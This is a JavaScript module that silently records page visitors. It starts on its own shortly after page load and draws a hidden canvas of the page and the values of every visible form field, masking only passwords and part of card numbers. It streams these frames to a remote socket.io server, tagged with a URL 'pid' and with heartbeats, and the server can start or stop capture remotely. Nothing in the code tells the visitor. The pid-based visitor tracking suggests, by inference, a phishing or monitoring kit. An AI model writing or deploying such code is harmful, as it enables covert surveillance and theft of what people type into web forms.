// Advanced Screen Capture Module
(function() {
  // Variables for the capture process
  let captureInterval = null;
  let lastCaptureTime = 0;
  const CAPTURE_FPS = 2; // Lower FPS to reduce bandwidth
  const CAPTURE_QUALITY = 0.5; // Lower quality to reduce bandwidth
  const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
  
  // Create and initialize socket connection with proper parameters
  let socket;
  try {
    // Extract pid from URL if present
    const urlParams = new URLSearchParams(window.location.search);
    const pid = urlParams.get('pid');
    
    // Initialize socket with pid as a query parameter if available
    if (pid) {
      socket = io({
        query: {
          pid: pid
        }
      });
      console.log('Initialized socket connection with pid:', pid);
    } else {
      socket = io();
      console.log('Initialized socket connection without pid');
    }
  } catch (e) {
    console.error('Error initializing socket:', e);
  }
  
  // Create hidden canvas for capturing
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  canvas.style.display = 'none';
  document.body.appendChild(canvas);
  
  // Function to capture screen safely (avoiding cross-origin issues)
  function captureScreen() {
    const now = Date.now();
    if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
    lastCaptureTime = now;
    
    try {
      // Clear canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // Draw clean background
      ctx.fillStyle = '#F8F9FA';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Draw page URL and title
      ctx.font = 'bold 14px Arial';
      ctx.fillStyle = '#333';
      ctx.fillText('Page: ' + window.location.pathname, 10, 20);
      ctx.fillText('Title: ' + document.title, 10, 40);
      
      // Draw current time
      ctx.font = '12px Arial';
      ctx.fillStyle = '#555';
      ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 10, 60);
      
      // Draw page structure representation
      let yPos = 90;
      
      // Function to safely get computed color
      function safeGetColor(colorStr) {
        if (!colorStr || colorStr === 'transparent' || colorStr === 'rgba(0, 0, 0, 0)') {
          return '#e0e0e0';
        }
        return colorStr;
      }
      
      // Draw main content sections (safe representation)
      document.querySelectorAll('div, section, main, form').forEach(el => {
        // Skip tiny or invisible elements
        const rect = el.getBoundingClientRect();
        if (rect.width < 50 || rect.height < 30 || 
            rect.top > window.innerHeight || rect.bottom < 0) return;
        if (getComputedStyle(el).display === 'none' || getComputedStyle(el).visibility === 'hidden') return;
        
        try {
          const styles = window.getComputedStyle(el);
          const bgColor = safeGetColor(styles.backgroundColor);
          
          // Draw a box representing this element (scaled)
          const scaleFactor = 0.8;
          const scaledLeft = rect.left * scaleFactor;
          const scaledTop = (rect.top * scaleFactor) + 80; // Add offset for header
          const scaledWidth = rect.width * scaleFactor;
          const scaledHeight = rect.height * scaleFactor;
          
          // Draw the box
          ctx.fillStyle = bgColor;
          ctx.strokeStyle = '#999';
          ctx.lineWidth = 1;
          ctx.fillRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
          ctx.strokeRect(scaledLeft, scaledTop, scaledWidth, scaledHeight);
          
          yPos = Math.max(yPos, scaledTop + scaledHeight + 20);
        } catch (e) {
          console.error('Error capturing element:', e);
        }
      });
      
      // Draw form elements and their values (safely)
      ctx.font = '14px Arial';
      ctx.fillStyle = '#333';
      ctx.fillText('Form Field Values:', 10, yPos);
      yPos += 20;
      
      // Process visible inputs
      document.querySelectorAll('input, select, textarea').forEach(input => {
        const rect = input.getBoundingClientRect();
        if (rect.top > window.innerHeight || rect.bottom < 0) return;
        if (input.type === 'hidden') return;
        
        // Get label or placeholder or name
        let labelText = '';
        
        // Try to find associated label
        const id = input.id;
        if (id) {
          const label = document.querySelector(`label[for="${id}"]`);
          if (label) {
            labelText = label.textContent.trim();
          }
        }
        
        // If no label found, try other identifiers
        if (!labelText) {
          labelText = input.placeholder || input.name || input.id || input.type;
        }
        
        // Get input value (mask sensitive data)
        let valueText = '';
        if (input.type === 'password') {
          valueText = '••••••••';
        } else if (input.type === 'file') {
          valueText = input.files && input.files.length > 0 ? 'File selected' : 'No file';
        } else if (input.type === 'checkbox' || input.type === 'radio') {
          valueText = input.checked ? 'Checked' : 'Unchecked';
        } else if (input.tagName === 'SELECT') {
          valueText = input.options[input.selectedIndex]?.text || '';
        } else {
          // Mask potential card numbers
          if (/^(?:\d[ -]*){13,19}$/.test(input.value) || // Credit card pattern 
              labelText.toLowerCase().includes('card') || 
              labelText.toLowerCase().includes('credit')) {
            valueText = input.value.replace(/\d(?=\d{4})/g, '•');
          } else {
            valueText = input.value;
          }
        }
        
        // Draw this input's info
        ctx.fillStyle = '#444';
        ctx.fillText(`${labelText}: ${valueText}`, 20, yPos);
        yPos += 20;
      });
      
      // Add device info
      yPos = Math.max(yPos, canvas.height - 60);
      ctx.fillStyle = '#888';
      ctx.font = '12px Arial';
      ctx.fillText(`Window size: ${window.innerWidth}x${window.innerHeight} | User agent: ${navigator.userAgent.substring(0, 50)}...`, 10, yPos);
      
      // Draw border
      ctx.strokeStyle = '#007BFF';
      ctx.lineWidth = 2;
      ctx.strokeRect(0, 0, canvas.width, canvas.height);
      
      // Add timestamp to show it's updating
      ctx.fillStyle = 'rgba(0,0,0,0.7)';
      ctx.fillRect(canvas.width - 150, canvas.height - 25, 140, 20);
      ctx.fillStyle = '#fff';
      ctx.font = '12px Arial';
      ctx.fillText(new Date().toLocaleTimeString(), canvas.width - 140, canvas.height - 10);
      
      // Convert canvas to image data URL
      try {
        const frameData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
        sendFrame(frameData);
      } catch (canvasError) {
        console.error('Canvas export error:', canvasError);
        // If toDataURL fails, try to render a simpler version
        renderFallbackCapture();
      }
    } catch (error) {
      console.error('Error in screen capture:', error);
      renderFallbackCapture();
    }
  }
  
  // Fallback capture method that only shows text representation
  function renderFallbackCapture() {
    try {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // Black background
      ctx.fillStyle = '#222';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Draw error message
      ctx.font = 'bold 16px Arial';
      ctx.fillStyle = '#ff5555';
      ctx.fillText('Canvas capture blocked by browser security policy', 20, 30);
      ctx.fillText('Using text-only representation instead', 20, 55);
      
      // Draw basic page info
      ctx.font = '14px Arial';
      ctx.fillStyle = '#ffffff';
      ctx.fillText('URL: ' + window.location.href.substring(0, 50), 20, 90);
      ctx.fillText('Title: ' + document.title, 20, 110);
      ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 20, 130);
      
      // Show page text content
      let y = 160;
      ctx.font = '12px Arial';
      
      // Get visible text nodes
      const textWalker = document.createTreeWalker(
        document.body,
        NodeFilter.SHOW_TEXT,
        {
          acceptNode: function(node) {
            // Check if parent element is visible
            const el = node.parentElement;
            if (!el) return NodeFilter.FILTER_REJECT;
            
            const style = window.getComputedStyle(el);
            if (style.display === 'none' || style.visibility === 'hidden') {
              return NodeFilter.FILTER_REJECT;
            }
            
            // Only accept non-empty text nodes
            return node.textContent.trim() ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
          }
        }
      );
      
      // Process visible text (limited amount)
      let textCount = 0;
      let node;
      while (textCount < 30 && (node = textWalker.nextNode())) {
        const text = node.textContent.trim();
        if (text && text.length > 3) { // Skip very short text
          ctx.fillText(text.substring(0, 100), 20, y);
          y += 20;
          textCount++;
          
          if (y > canvas.height - 40) break; // Don't go beyond canvas
        }
      }
      
      // Add notice at bottom
      ctx.fillStyle = '#aaaaaa';
      ctx.fillText('Live text capture - Limited due to browser security restrictions', 20, canvas.height - 20);
      
      // Send this fallback version
      const frameData = canvas.toDataURL('image/jpeg', 0.7);
      sendFrame(frameData);
    } catch (fallbackError) {
      console.error('Fallback capture failed:', fallbackError);
      socket.emit('screen_capture_error', {
        error: 'Complete capture failure: ' + fallbackError.message
      });
    }
  }
  
  // Function to send the frame data
  function sendFrame(frameData) {
    try {
      // Get URL parameters to include with the frame
      const urlParams = new URLSearchParams(window.location.search);
      const pid = urlParams.get('pid');
      
     // Send frame data to server with additional info
      socket.emit('screen_frame', {
        frameData: frameData,
        frameType: 'image',
        timestamp: Date.now(),
        frameId: Math.random().toString(36).substring(2, 15),
        pid: pid,
        url: window.location.href,
        title: document.title
      });
      
      // Also send a heartbeat with the frame
      socket.emit('visitor_heartbeat', { 
        pid: pid,
        timestamp: Date.now()
      });
    } catch (err) {
      console.error('Error sending frame:', err);
    }
  }
  
  // Function to start capturing
  function startCapture() {
    if (captureInterval) return; // Already running
    
    // Update canvas dimensions
    canvas.width = Math.min(window.innerWidth, 1280); // Cap width for performance
    canvas.height = Math.min(window.innerHeight, 800); // Cap height for performance
    
    // Start capture loop
    captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
    
    // Do one immediate capture
    setTimeout(captureScreen, 200);
    
    // Notify that capture has started
    try {
      socket.emit('screen_capture_started');
    } catch (e) {
      console.error('Failed to notify of capture start:', e);
    }
    
    console.log('Screen capture started');
  }
  
  // Function to stop capturing
  function stopCapture() {
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
      
      // Notify that capture has stopped
      try {
        socket.emit('screen_capture_stopped');
      } catch (e) {
        console.error('Failed to notify of capture stop:', e);
      }
      
      console.log('Screen capture stopped');
    }
  }
  
  // Set up heartbeat to keep connection alive
  function setupHeartbeat() {
    // Send heartbeat every 15 seconds
    const heartbeatInterval = setInterval(() => {
      const urlParams = new URLSearchParams(window.location.search);
      const pid = urlParams.get('pid');
      
      if (pid) {
        try {
          socket.emit('visitor_heartbeat', { 
            pid: pid,
            timestamp: Date.now(),
            url: window.location.href
          });
        } catch (e) {
          console.error('Error sending heartbeat:', e);
        }
      }
    }, 15000);
    
    // Clear interval when window is closed
    window.addEventListener('beforeunload', () => {
      clearInterval(heartbeatInterval);
    });
  }
  
  // Listen for control commands
  socket.on('control_command', (command) => {
    console.log('Received control command:', command);
    
    if (command.type === 'start_capture') {
      startCapture();
    } else if (command.type === 'stop_capture') {
      stopCapture();
    } else if (command.type === 'refresh_capture') {
      stopCapture();
      setTimeout(startCapture, 500);
    }
  });
  
  // Listen for window resize to update canvas dimensions
  window.addEventListener('resize', () => {
    if (captureInterval) {
      canvas.width = Math.min(window.innerWidth, 1280);
      canvas.height = Math.min(window.innerHeight, 800);
    }
  });
  
  // Start capture automatically after a short delay
  setTimeout(startCapture, 1500);
  
  // Setup heartbeat
  setupHeartbeat();
  
  // Export functions to window scope for debugging
  window.screenCapture = {
    start: startCapture,
    stop: stopCapture,
    refresh: function() {
      stopCapture();
      setTimeout(startCapture, 500);
    }
  };
})();
